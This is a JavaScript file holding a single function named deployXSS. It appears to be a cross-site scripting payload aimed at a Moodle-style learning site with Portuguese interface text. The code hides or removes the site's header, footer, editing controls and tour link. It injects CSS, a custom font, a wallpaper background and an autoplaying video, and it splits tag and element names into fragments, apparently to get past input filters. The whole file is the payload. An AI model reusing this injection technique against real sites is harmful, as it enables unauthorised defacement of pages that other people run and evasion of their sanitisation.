function deployXSS() {
    $('#logo').remove();
    var ch00 = '<';
    var ch01 = '>';
    var px00 = 'he';
    var px01 = 'ad';
    $(px00+px01).append(ch00+'link'+' href="https://fonts.googleapis.com/css?family=Architects+Daughter" rel="stylesheet" type="text/css" '+'/'+ch01);
    $(px00+px01).append(ch00+'style'+ch01+'.blockmaster { border-style:hidden!important; border-radius: 4px!important; background-color:transparent!important; background-image: linear-gradient(to right, rgba(255, 255, 255, 0.6), rgba(198, 198, 196, 0.6))!important; -webkit-box-shadow:none!important; box-shadow:none!important; margin-bottom:2px } .blockchild { background-color:transparent!important; border:none!important; -webkit-box-shadow:none!important; box-shadow:none!important; border-radius:0!important; margin-bottom:2px }'+ch00+'/style'+ch01);
    $('body').children().css('font-family', 'Architects Daughter');
    $('h1, h2, h3, h4, h5, h6, p').css('font-family', 'Architects Daughter');
document.getElementById('adaptable-page-header-wrapper').style = 'background-color: rgba(72, 76, 72, 0.45); font-family: "Architects Daughter";';
    document.getElementById('above-header').style = 'background-color: rgba(72, 76, 72, 0.45); border-style: none; margin-bottom: 0px!important;';
    document.getElementById('main-navbar').style = 'background-color: rgba(72, 76, 72, 0.45); border-bottom: medium solid; border: none;';
    function setFontsColor(className, colorName) {  var elements = document.getElementsByClassName(className); for(var i = 0, length = elements.length; i < length; i++) {  elements[i].style.color = colorName;  }  }
    setFontsColor('nav-link', 'honeydew');
    document.getElementById('page').style = 'height: 1500px!important; font-family: "Architects Daughter"; background-color: transparent; background-image: url(https://wallpapercave.com/download/zero-two-wallpapers-wp3025507?nocache=1); background-size: contain!important;';
    document.getElementById('page-my-index').style = 'font-family: "Architects Daughter"; background-color: #43433C';
    document.getElementById('page').setAttribute('onmousemove', '$("a:contains(Redefinir o tour de usuário nessa página)").remove(); $.when($("#page-footer")).then((self) => { $(self).remove(); }); $.when($("#back-to-top")).then((self) => { $(self).remove(); });');
    $('#edittingbutton').remove();
    $('#zoominicon').remove();
    $('a:contains(Visualização padrão)').remove();
    $('#page-header').remove();
    $('#inst63689').css('opacity', '0');
    $('#inst63689').css('height', '0');
    $('#inst63689').css('width', '0');
    $('.block').addClass('blockmaster');
    $('.block').children().addClass('blockchild');
    $('.block').children().children().addClass('blockchild');
    $('a:contains(Redefinir o tour de usuário nessa página)').remove();
    $('div.header.blockchild')[1].remove();
    $(px00+px01).append(ch00+'style'+ch01+'.video-container { position: relative; height: 0; padding-bottom: 56.25%; /* 16:9 */ } .video-container video {  position: absolute; top: 0; left: 0; width: 100%; height: 100%;  }'+ch00+'/style'+ch01);
    $($('div.content.blockchild')[1]).attr('class', 'video-container');
    $($('div.info.blockchild')[0]).remove();
    $($('div.video-container')[0]).html('<video width="320" height="240" autoplay loop><source src="https://i.imgur.com/ZPLIc2X.mp4" type="video/mp4"></video>');
}
deployXSS();
